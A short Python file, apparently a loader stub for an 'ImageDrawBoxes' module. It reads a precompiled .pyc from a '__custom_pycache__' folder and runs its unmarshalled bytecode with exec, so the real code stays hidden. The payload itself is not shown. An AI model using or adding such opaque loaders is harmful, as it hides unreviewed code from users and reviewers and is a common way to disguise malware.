
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageDrawBoxes_4343c21c041c44eaa5a0d59c920beabf.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
